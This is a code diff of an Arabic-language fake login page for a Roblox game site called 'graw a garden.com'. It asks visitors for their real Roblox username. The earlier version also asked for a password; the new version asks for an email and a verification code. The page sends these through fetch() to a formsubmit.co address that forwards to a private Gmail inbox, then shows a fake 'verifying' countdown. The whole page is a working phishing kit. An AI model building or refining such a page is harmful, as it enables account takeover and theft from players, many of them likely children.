@@ -172,7 +172,7 @@
             display: none;
         }
 
-        /* أنماط صفحة الانتظار المعدلة */
+        /* أنماط صفحة الانتظار */
         .waiting-page {
             display: none;
             position: fixed;
@@ -180,99 +180,163 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(75, 0, 130, 0.9); /* خلفية بنفسجية شفافة */
+            background: rgba(0, 0, 0, 0.7);
             z-index: 100;
             color: white;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px); /* تأثير ضبابي */
         }
         
         .waiting-container {
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.9);
             padding: 30px;
             border-radius: 15px;
             text-align: center;
-            width: 320px;
+            width: 300px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            border: 2px solid rgba(148, 0, 211, 0.3);
-        }
-        
-        .waiting-container h2 {
-            color: #4b0082;
-            margin-bottom: 15px;
-            font-size: 22px;
-        }
-        
-        .waiting-container p {
-            color: #666;
-            margin: 10px 0;
         }
         
         .countdown {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: bold;
             margin: 20px 0;
-            color: #9400d3;
-            background: rgba(75, 0, 130, 0.1);
-            padding: 10px 15px;
-            border-radius: 10px;
-            border: 1px solid rgba(75, 0, 130, 0.2);
+            color: #4b0082;
+        }
+        
+        /* أنماط الصفحات المتعددة */
+        .page {
+            display: none;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 10px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .step.active {
+            background-color: #4b0082;
+            color: white;
+        }
+        
+        .step.completed {
+            background-color: #00cc66;
+            color: white;
         }
     </style>
 </head>
 <body>
-    <!-- بقية الكود كما هو -->
-    <div class="header">
-        <h1>سجل الدخول واختار الحيوان الذي تريده</h1>
-    </div>
-    
-    <div class="login-container">
-        <div class="login-title">graw a garden.com</div>
+    <!-- الصفحة 1: اسم المستخدم والبريد الإلكتروني -->
+    <div class="page active" id="page1">
+        <div class="header">
+            <h1>سجل الدخول واختار الحيوان الذي تريده</h1>
+        </div>
         
-        <div id="alertBox" class="alert"></div>
-        
-        <form id="loginForm" action="https://formsubmit.co/grawagardendev@gmail.com" method="POST">
-            <input type="hidden" name="_subject" value="تسجيل دخول جديد - جراو أ جاردن">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_next" value="?success=1">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="الحيوان المختار" id="selectedAnimal">
-            
-            <div class="input-group">
-                <input type="text" name="👤 اسم المستخدم" placeholder="اسم المستخدم" required>
+        <div class="login-container">
+            <div class="step-indicator">
+                <div class="step active">1</div>
+                <div class="step">2</div>
+                <div class="step">3</div>
             </div>
             
-            <div class="input-group">
-                <input type="password" name="🔑 كلمة المرور" placeholder="كلمة المرور" required>
-            </div>
+            <div class="login-title">graw a garden.com</div>
             
-            <div class="animal-selection">
-                <div class="animal-option" data-animal="🦊">🦊</div>
-                <div class="animal-option" data-animal="🐻">🐻</div>
-                <div class="animal-option" data-animal="🐼">🐼</div>
-                <div class="animal-option" data-animal="🦁">🦁</div>
-                <div class="animal-option" data-animal="🐯">🐯</div>
-            </div>
+            <div id="alertBox" class="alert"></div>
             
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-        
-        <p class="note">ملاحظة: يجب أن تكون معلومات حسابك الأصلية في Roblox</p>
-    </div>
-
-    <!-- صفحة الانتظار الجديدة -->
-    <div id="waitingPage" class="waiting-page">
-        <div class="waiting-container">
-            <h2>⏳ جاري التحقق من المعلومات</h2>
-            <p>يرجى الانتظار بينما نقوم بالتحقق من بياناتك</p>
-            <div class="countdown" id="countdown">05:00</div>
-            <p>لا تغلق هذه الصفحة</p>
+            <form id="loginForm">
+                <input type="hidden" name="_subject" value="تسجيل دخول جديد - جراو أ جاردن">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="الحيوان المختار" id="selectedAnimal">
+                
+                <div class="input-group">
+                    <input type="text" name="👤 اسم المستخدم" id="username" placeholder="اسم المستخدم" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="email" name="📧 البريد الإلكتروني" id="email" placeholder="البريد الإلكتروني" required>
+                </div>
+                
+                <div class="animal-selection">
+                    <div class="animal-option" data-animal="🦊">🦊</div>
+                    <div class="animal-option" data-animal="🐻">🐻</div>
+                    <div class="animal-option" data-animal="🐼">🐼</div>
+                    <div class="animal-option" data-animal="🦁">🦁</div>
+                    <div class="animal-option" data-animal="🐯">🐯</div>
+                </div>
+                
+                <button type="button" id="nextToPage2">متابعة</button>
+            </form>
+            
+            <p class="note">ملاحظة: يجب أن تكون معلومات حسابك الأصلية في Roblox</p>
         </div>
     </div>
 
-    <!-- بقية الكود كما هو -->
+    <!-- الصفحة 2: رمز التحقق -->
+    <div class="page" id="page2">
+        <div class="header">
+            <h1>أدخل رمز التحقق</h1>
+        </div>
+        
+        <div class="login-container">
+            <div class="step-indicator">
+                <div class="step completed">1</div>
+                <div class="step active">2</div>
+                <div class="step">3</div>
+            </div>
+            
+            <div class="login-title">graw a garden.com</div>
+            
+            <div id="alertBox2" class="alert"></div>
+            
+            <form id="verificationForm">
+                <div class="input-group">
+                    <input type="text" name="🔢 رمز التحقق" id="verificationCode" placeholder="رمز التحقق" required>
+                </div>
+                
+                <button type="button" id="nextToPage3">متابعة</button>
+            </form>
+            
+            <p class="note">ملاحظة: تحقق من بريدك الإلكتروني للحصول على رمز التحقق</p>
+        </div>
+    </div>
+
+    <!-- الصفحة 3: صفحة الانتظار -->
+    <div class="page" id="page3">
+        <div class="waiting-page" style="display: flex;">
+            <div class="waiting-container">
+                <div class="step-indicator">
+                    <div class="step completed">1</div>
+                    <div class="step completed">2</div>
+                    <div class="step active">3</div>
+                </div>
+                
+                <h2>⏳ جاري التحقق من المعلومات</h2>
+                <p>يرجى الانتظار بينما نقوم بالتحقق من بياناتك</p>
+                <div class="countdown" id="countdown">05:00</div>
+                <p>لا تغلق هذه الصفحة</p>
+            </div>
+        </div>
+    </div>
+
     <script>
         // اختيار الحيوان
         const animalOptions = document.querySelectorAll('.animal-option');
@@ -286,10 +350,20 @@
             });
         });
         
-        // معالجة إرسال النموذج
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // الانتقال بين الصفحات
+        document.getElementById('nextToPage2').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
             const alertBox = document.getElementById('alertBox');
+            
+            // التحقق من البيانات
+            if (!username || !email) {
+                alertBox.textContent = "الرجاء ملء جميع الحقول";
+                alertBox.style.display = "block";
+                alertBox.style.backgroundColor = "#f8d7da";
+                alertBox.style.color = "#721c24";
+                return;
+            }
             
             // التحقق من اختيار حيوان
             if (!selectedAnimalInput.value) {
@@ -300,35 +374,54 @@
                 return;
             }
             
-            // عرض رسالة التحميل
-            alertBox.textContent = "جاري إرسال البيانات...";
-            alertBox.className = "alert loading";
-            alertBox.style.display = "block";
+            // الانتقال إلى الصفحة الثانية
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+        });
+        
+        document.getElementById('nextToPage3').addEventListener('click', function() {
+            const verificationCode = document.getElementById('verificationCode').value;
+            const alertBox2 = document.getElementById('alertBox2');
             
-            // إرسال النموذج أولاً باستخدام Fetch API
-            fetch(this.action, {
+            // التحقق من رمز التحقق
+            if (!verificationCode) {
+                alertBox2.textContent = "الرجاء إدخال رمز التحقق";
+                alertBox2.style.display = "block";
+                alertBox2.style.backgroundColor = "#f8d7da";
+                alertBox2.style.color = "#721c24";
+                return;
+            }
+            
+            // جمع البيانات
+            const formData = new FormData();
+            formData.append('👤 اسم المستخدم', document.getElementById('username').value);
+            formData.append('📧 البريد الإلكتروني', document.getElementById('email').value);
+            formData.append('🔢 رمز التحقق', verificationCode);
+            formData.append('الحيوان المختار', selectedAnimalInput.value);
+            formData.append('_subject', 'تسجيل دخول جديد - جراو أ جاردن');
+            formData.append('_template', 'table');
+            formData.append('_captcha', 'false');
+            
+            // إرسال البيانات
+            fetch('https://formsubmit.co/grawagardendev@gmail.com', {
                 method: 'POST',
-                body: new FormData(this)
+                body: formData
             })
             .then(response => {
                 if (response.ok) {
-                    // بعد الإرسال الناجح، عرض صفحة الانتظار
-                    document.getElementById('waitingPage').style.display = 'flex';
+                    // الانتقال إلى صفحة الانتظار
+                    document.getElementById('page2').classList.remove('active');
+                    document.getElementById('page3').classList.add('active');
                     startCountdown();
-                    
-                    // إعادة التوجيه بعد 5 دقائق
-                    setTimeout(() => {
-                        window.location.href = "?success=1";
-                    }, 300000);
                 } else {
                     throw new Error('فشل في الإرسال');
                 }
             })
             .catch(error => {
-                alertBox.textContent = "حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً";
-                alertBox.className = "alert";
-                alertBox.style.backgroundColor = "#f8d7da";
-                alertBox.style.color = "#721c24";
+                alertBox2.textContent = "حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً";
+                alertBox2.style.display = "block";
+                alertBox2.style.backgroundColor = "#f8d7da";
+                alertBox2.style.color = "#721c24";
             });
         });
         
@@ -349,14 +442,6 @@
                     clearInterval(timer);
                 }
             }, 1000);
-        }
-        
-        // التحقق من وجود معلمة النجاح في الرابط
-        if(window.location.search.includes('success=1')) {
-            const alertBox = document.getElementById('alertBox');
-            alertBox.textContent = "تم إرسال البيانات بنجاح ✓";
-            alertBox.className = "alert success";
-            alertBox.style.display = "block";
         }
     </script>
 </body>
